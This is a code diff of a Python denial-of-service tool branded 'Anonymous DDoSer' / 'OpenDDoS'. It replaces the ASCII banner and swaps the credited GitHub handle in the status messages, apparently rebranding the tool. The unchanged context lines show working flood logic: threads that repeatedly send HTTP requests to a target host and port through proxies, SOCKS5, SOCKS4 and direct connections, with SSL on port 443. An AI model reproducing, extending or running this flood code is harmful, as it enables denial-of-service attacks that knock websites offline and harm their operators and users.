@@ -178,19 +178,19 @@ def logo():
         os.system('clear')
     else:
         os.system('color ' +random.choice(['a', 'b', 'c', 'd'])+ " & cls & title Download: bit.ly/AnonyV28 ~ Anonymous DDoSer v2.8")
-    print('''
-             - github.com/ghostapustaja -
-
-    /\_____/\                                 _     _           
-   /  o   o  \                               | |   | |          
-  ( ==  ^  == )     ___  _ __   ___ _ __   __| | __| | ___  ___ 
-   )         (     / _ \| '_ \ / _ \ '_ \ / _` |/ _` |/ _ \/ __|
-                   | (_) | |_) |  __/ | | | (_| | (_| | (_) \__ \
-                    \___/| .__/ \___|_| |_|\__,_|\__,_|\___/|___/
-
-  (           )   ========================================================
-      OpenDDoS - Best Ddos attack For FREE
- ===== Version: [ Deluxe ]''')
+    print('''                              .___.                              
+          /)               ,-^     ^-.                           
+         //               /           \                          
+.-------| |--------------/  __     __  \-------------------.__   
+|WMWMWMW| |>>>>>>>>>>>>> | />>\   />>\ |>>>>>>>>>>>>>>>>>>>>>>:> 
+`-------| |--------------| \__/   \__/ |-------------------'^^   
+         \\               \    /|\    /                          
+          \)               \   \_/   /                           
+                            |       |                            
+                            |+H+H+H+|                            
+                            \       /                            
+                             ^-----^                             
+                     Open-DDos Version: [ Deluxe ]''')
     try:
         print("\n[*] Target : " +str(url_main)+ ":" +str(port))
     except:
@@ -571,9 +571,9 @@ class Proxy(threading.Thread):
                 s.send(str.encode(request))
                 s.send(str.encode(request))
                 #req_code += 1
-                #sys.stdout.write("[!] github.com/ghostapustaja | Sent [" +str(req_code)+ "] | Error [" +str(error)+ "]|=> [" +host_url+ ":" +str(port)+ "]\r")
+                #sys.stdout.write("[!] github.com/gr1mx0 | Sent [" +str(req_code)+ "] | Error [" +str(error)+ "]|=> [" +host_url+ ":" +str(port)+ "]\r")
                 #sys.stdout.flush()
-                print("[!] github.com/ghostapustaja | Proxy @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
+                print("[!] github.com/gr1mx0 | Proxy @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                 try:
                     for y in range(multiple):
                         s.send(str.encode(request))
@@ -643,7 +643,7 @@ class Socks(threading.Thread):
                 s.send(str.encode(request))
                 s.send(str.encode(request))
                 s.send(str.encode(request))
-                print("[!] github.com/ghostapustaja | Socks5 @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
+                print("[!] github.com/gr1mx0 | Socks5 @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                 try:
                     for y in range(multiple):
                         s.send(str.encode(request))
@@ -673,7 +673,7 @@ class Socks(threading.Thread):
                     if str(port) == '443':
                         s = ssl.wrap_socket(s)
                     s.send(str.encode(request))
-                    print("[!] github.com/ghostapustaja | Socks4 @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
+                    print("[!] github.com/gr1mx0 | Socks4 @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                     try:
                         for y in range(multiple):
                             s.send(str.encode(request))
@@ -721,9 +721,9 @@ class Home(threading.Thread):
                 s.send(str.encode(request))
                 s.send(str.encode(request))
                 s.send(str.encode(request))
-                print("[+] github.com/ghostapustaja | Home @ " +str(random.randint(0, 1000))+ " => " +str(host_url)+ ":" +str(port))
+                print("[+] github.com/gr1mx0 | Home @ " +str(random.randint(0, 1000))+ " => " +str(host_url)+ ":" +str(port))
                 #req_code += 1
-                #sys.stdout.write("[!] github.com/ghostapustaja | Sent [" +str(req_code)+ "] | Error [" +str(error)+ "]|=> [" +host_url+ ":" +str(port)+ "]\r")
+                #sys.stdout.write("[!] github.com/gr1mx0 | Sent [" +str(req_code)+ "] | Error [" +str(error)+ "]|=> [" +host_url+ ":" +str(port)+ "]\r")
                 #sys.stdout.flush()
                 try:
                     for y in range(multiple):
@@ -775,7 +775,7 @@ class JSv1(threading.Thread):
                     http.request("GET", url, headers=headersx)
                 else:
                     http.request("GET /?=" +str(random.randint(0,20000)), headers=headersx)
-                print("[+] github.com/ghostapustaja | JS-Normal @ " +str(random.randint(0, 1000))+ " => " +str(host_url))
+                print("[+] github.com/gr1mx0 | JS-Normal @ " +str(random.randint(0, 1000))+ " => " +str(host_url))
                 try:
                     for y in range(multiple):
                         http.request("GET", url,headers=headersx)
